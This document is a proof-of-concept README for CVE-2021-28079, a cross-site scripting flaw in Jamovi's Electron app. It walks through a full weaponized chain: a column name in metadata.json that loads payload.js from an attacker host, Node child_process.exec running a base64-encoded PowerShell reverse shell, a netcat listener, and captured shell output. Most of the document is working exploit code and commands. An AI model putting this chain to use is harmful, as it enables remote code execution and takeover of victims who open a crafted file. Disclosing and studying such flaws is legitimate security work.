# CVE-2021-28079 - POC

Jamovi &lt;=1.6.18 is affected by a cross-site scripting (XSS) vulnerability. The column-name is vulnerable to XSS in the ElectronJS Framework. An attacker can make a .omv (Jamovi) document containing a payload. When opened by victim, the payload is triggered.

```shell
🔥\> file example.omv
example.omv: Zip archive data, at least v2.0 to extract
```
All OMV files are archived data. So, you can extract it and modify to exploit the XSS bug.

```shell
🔥\> unzip example.omv
Archive:  example.omv
  inflating: META-INF/MANIFEST.MF
  inflating: index.html
  inflating: metadata.json
  inflating: xdata.json
  inflating: data.bin
  inflating: 01 empty/analysis

🔥\> ls
'01 empty'   data.bin   index.html   metadata.json   META-INF   example.omv   xdata.json
```
Edit the metadata.json file and add your XSS payload.

```shell
🔥\> python3 -m json.tool metadata.json | head
{
    "dataSet": {
        "rowCount": 20,
        "columnCount": 3,
        "removedRows": [],
        "addedRows": [],
        "fields": [
            {
                "name": "<script src=\"http://10.x.x.x/payload.js\"></script>",
                "id": 1,
```
The Name field is vulnerable to XSS, that's where we have to add our XSS payload. Make sure to escape double quotes which are inside the script. Upon successful exploit it hits our web server, where our actual payload exists. Below JS script we can use to execute command to gain shell access.

```shell
require('child_process').exec('command')
```
If it's windows os then you can use powershell and if it's linux you can use bash one-liner.

```shell
🔥\> cat payload.js
require('child_process').exec('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AeAAuAHgALgB4ACIALAA0ADUANgA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==')
```
Above is an example of JS file with powershell command. Now we need to zip it back with this upadted metadata.json.

```shell
🔥\> zip -r example.omv .
  adding: 01 empty/ (stored 0%)
  adding: 01 empty/analysis (deflated 8%)
  adding: index.html (deflated 67%)
  adding: xdata.json (deflated 33%)
  adding: metadata.json (deflated 78%)
  adding: META-INF/ (stored 0%)
  adding: META-INF/MANIFEST.MF (deflated 30%)
  adding: data.bin (deflated 84%)

🔥\> file example.omv
example.omv: Zip archive data, at least v2.0 to extract
```
Setup web server to serve payload.js file

```shell
🔥\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Setup netcat listener

```shell
🔥\> rlwrap nc -lvnp 4567
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4567
Ncat: Listening on 0.0.0.0:4567
```
Now execute the 'example.omv' file to exploit the XSS bug and check back your web server for hit and then check the netcat listener.

```shell
🔥\> sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.x.x.x - - [31/Oct/2021 08:53:25] "GET /payload.js HTTP/1.1" 200 -
```

```shell
🔥\> rlwrap nc -lvnp 4567
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4567
Ncat: Listening on 0.0.0.0:4567
Ncat: Connection from 10.x.x.x.
Ncat: Connection from 10.x.x.x:76544.

PS C:\Windows\system32> whoami
omni\localuser
```







